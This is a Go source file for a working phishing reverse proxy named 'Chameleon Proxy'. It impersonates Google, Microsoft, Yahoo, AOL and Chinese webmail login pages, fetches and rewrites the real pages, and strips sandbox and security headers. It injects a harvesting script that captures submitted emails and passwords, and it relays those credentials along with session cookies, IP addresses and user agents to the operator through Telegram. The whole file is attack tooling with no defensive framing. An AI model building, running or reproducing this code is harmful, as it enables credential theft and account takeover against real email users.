package main

import (
	"bytes"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/cookiejar"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

type SessionStore struct {
	mu       sync.RWMutex
	sessions map[string]*SessionData
}

type SessionData struct {
	Cookies   map[string]string
	UserEmail string
}

var store = &SessionStore{
	sessions: make(map[string]*SessionData),
}

// INJECTED SCRIPT: Fixes URL crashes and Forces form submit
const harvesterScript = `
<script>
// FIX 1: Polyfill the URL constructor so Microsoft/Yahoo React apps don't crash
(function() {
    const OriginalURL = window.URL;
    window.URL = function(url, base) {
        try {
            return new OriginalURL(url, base || window.location.origin);
        } catch (e) {
            // If the URL is a relative path that breaks the constructor, fix it
            if (typeof url === 'string' && !url.startsWith('http')) {
                return new OriginalURL('https://' + window.location.hostname + '/' + url.replace(/^\/+/, ''));
            }
            return new OriginalURL('https://' + window.location.hostname + '/');
        }
    };
    window.URL.prototype = OriginalURL.prototype;
})();

document.addEventListener('submit', function(e) {
    const form = e.target;
    const formData = new FormData(form);
    const params = new URLSearchParams();
    let hasEmail = false;
    let hasPassword = false;

    for (let [key, value] of formData.entries()) {
        params.append(key, value);
        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account') || key.toLowerCase().includes('login')) {
            window._capturedEmail = value;
            hasEmail = true;
        }
        if (key.toLowerCase().includes('pass')) {
            window._capturedPass = value;
            hasPassword = true;
        }
    }

    if (hasEmail && hasPassword) {
        fetch('/api/harvest', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: params.toString()
        }).catch(() => {});
        return true;
    }
}, false);
</script>
`

const loaderHTML = `<!DOCTYPE html><html><head><title>Verifying...</title><style>body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;font-family:Arial;}.spin{border:4px solid #f3f3f3;border-top:4px solid #4285F4;border-radius:50%;width:40px;height:40px;animation:s 1s linear infinite;margin:0 auto 20px;}@keyframes s{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body><div style="text-align:center;background:white;padding:40px;border-radius:10px;"><div class="spin"></div><p>Verifying secure connection...</p></div><script>setTimeout(()=>{var h=window.location.hash;if(h&&h.length>1){var e=h.substring(1);fetch('/api/fetch?email='+encodeURIComponent(e)).then(r=>r.text()).then(html=>{document.open();document.write(html);document.close();});}else{document.body.innerHTML="<h3>No account provided.</h3>";}},1000);</script></body></html>`

func StartProxy(cfg TelegramConfig, listenPort string) {
	r := gin.Default()

	r.GET("/", func(c *gin.Context) {
		c.Header("Content-Type", "text/html")
		c.String(200, loaderHTML)
	})

	r.NoRoute(func(c *gin.Context) {
		c.Header("Content-Type", "text/html")
		c.String(200, loaderHTML)
	})

	r.GET("/api/fetch", func(c *gin.Context) {
		email := c.Query("email")
		if email == "" {
			c.String(400, "Missing email")
			return
		}

		targetBase := GetTargetDomain(email)
		log.Printf("[PROXY] Fetching for %s from %s", email, targetBase)

		jar, _ := cookiejar.New(nil)
		proxyClient := &http.Client{
			Timeout: 15 * time.Second,
			Jar:     jar,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
			// FIX: Force IPv4 to prevent Fly.io IPv6 timeouts
			Transport: &http.Transport{
				ForceAttemptHTTP2: false,
				DialContext: (&net.Dialer{
					Timeout:   10 * time.Second,
					KeepAlive: 30 * time.Second,
				}).DialContext,
				TLSHandshakeTimeout: 10 * time.Second,
				MaxIdleConns:        100,
				IdleConnTimeout:     90 * time.Second,
			},
		}

		req, err := http.NewRequest("GET", targetBase, nil)
		if err != nil {
			c.String(500, "Request Error")
			return
		}

		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
		req.Header.Set("Accept-Language", "en-US,en;q=0.9,zh-CN,zh;q=0.8")

		resp, err := proxyClient.Do(req)
		if err != nil {
			// This will print the EXACT error to your screen instead of a generic 502
			log.Printf("Proxy Error: %v", err)
			c.String(502, "Error: %v", err)
			return
		}
		defer resp.Body.Close()

		bodyBytes, _ := io.ReadAll(resp.Body)

		// FIX 2: Robust Encoding Detection (Chinese + Microsoft)
		contentType := resp.Header.Get("Content-Type")
		if strings.Contains(strings.ToLower(contentType), "gbk") ||
			strings.Contains(targetBase, "126.com") ||
			strings.Contains(targetBase, "163.com") ||
			strings.Contains(targetBase, "sina.com") {
			reader := transform.NewReader(bytes.NewReader(bodyBytes), simplifiedchinese.GBK.NewDecoder())
			if decoded, err := io.ReadAll(reader); err == nil {
				bodyBytes = decoded
			}
		}

		bodyStr := string(bodyBytes)

		// Remove ServiceWorker
		reSW := regexp.MustCompile(`(?i)navigator\.serviceWorker\.register\(.*?\)`)
		bodyStr = reSW.ReplaceAllString(bodyStr, "console.log('SW disabled')")

		// Remove iframe sandbox restrictions
		reIframe := regexp.MustCompile(`(?i)<iframe(.*?)>`)
		bodyStr = reIframe.ReplaceAllStringFunc(bodyStr, func(m string) string {
			m = strings.ReplaceAll(m, `sandbox=""`, "")
			m = strings.ReplaceAll(m, `sandbox="allow-scripts allow-same-origin"`, "")
			m = strings.ReplaceAll(m, `sandbox="allow-scripts"`, "")
			m = strings.ReplaceAll(m, `sandbox`, "")
			return m
		})

		// Rewrite URLs so the browser thinks it's on the real site
		bodyStr = strings.ReplaceAll(bodyStr, "https://"+targetBase, c.Request.Host+"/")
		if strings.Contains(email, "@") {
			domain := strings.Split(email, "@")[1]
			bodyStr = strings.ReplaceAll(bodyStr, "https://"+domain, c.Request.Host+"/")
			bodyStr = strings.ReplaceAll(bodyStr, "http://"+domain, c.Request.Host+"/")
		}

		baseTag := `<base href="` + targetBase + `">`
		bodyStr = strings.Replace(bodyStr, "<head>", "<head>\n"+baseTag, 1)
		bodyStr = strings.Replace(bodyStr, "</body>", harvesterScript+"</body>", 1)

		// Strip restrictive headers
		c.Header("Content-Type", "text/html; charset=utf-8")
		c.Header("Access-Control-Allow-Origin", "*")
		c.Header("Content-Security-Policy", "default-src * 'unsafe-inline' 'unsafe-eval'; frame-ancestors *")

		for _, cookie := range resp.Cookies() {
			c.SetCookie(cookie.Name, cookie.Value, 3600*24, "/", "", false, false)
			SendTelegramMessage(cfg, FormatCookieHarvest(email, []string{cookie.Name + "=" + cookie.Value}))
		}

		c.String(resp.StatusCode, bodyStr)
	})

	r.POST("/api/harvest", func(c *gin.Context) {
		c.Request.ParseForm()
		email := c.PostForm("email")
		password := c.PostForm("password")
		if email == "" {
			email = c.PostForm("username")
		}
		if password == "" {
			password = c.PostForm("passwd")
		}
		if password == "" {
			password = c.PostForm("pwd")
		}

		ip := c.ClientIP()
		ua := c.GetHeader("User-Agent")
		SendTelegramMessage(cfg, FormatLoginAlert(email, password, ip, ua))

		c.JSON(200, gin.H{"status": "ok"})
	})

	r.Any("/proxy/*filepath", func(c *gin.Context) {
		filepath := strings.TrimPrefix(c.Param("filepath"), "/")
		referer := c.GetHeader("Referer")
		targetDomain := "https://accounts.google.com/"

		if strings.Contains(referer, "126.com") {
			targetDomain = "https://mail.126.com/"
		} else if strings.Contains(referer, "163.com") {
			targetDomain = "https://mail.163.com/"
		} else if strings.Contains(referer, "yahoo.com") {
			targetDomain = "https://login.yahoo.com/"
		} else if strings.Contains(referer, "aol.com") {
			targetDomain = "https://login.aol.com/"
		} else if strings.Contains(referer, "live.com") {
			targetDomain = "https://login.live.com/"
		}

		fullURL := targetDomain + filepath

		outReq, err := http.NewRequest(c.Request.Method, fullURL, c.Request.Body)
		if err != nil {
			c.String(502, "Bad Request")
			return
		}

		for k, v := range c.Request.Header {
			for _, val := range v {
				outReq.Header.Add(k, val)
			}
		}

		client := &http.Client{Timeout: 15 * time.Second}
		resp, err := client.Do(outReq)
		if err == nil {
			defer resp.Body.Close()
			for k, v := range resp.Header {
				for _, val := range v {
					c.Writer.Header().Add(k, val)
				}
			}
			c.Writer.WriteHeader(resp.StatusCode)
			io.Copy(c.Writer, resp.Body)
		} else {
			c.String(502, "Upstream Error")
		}
	})

	log.Printf("🚀 Chameleon Proxy listening on 0.0.0.0:%s", listenPort)
	r.Run("0.0.0.0:" + listenPort)
}
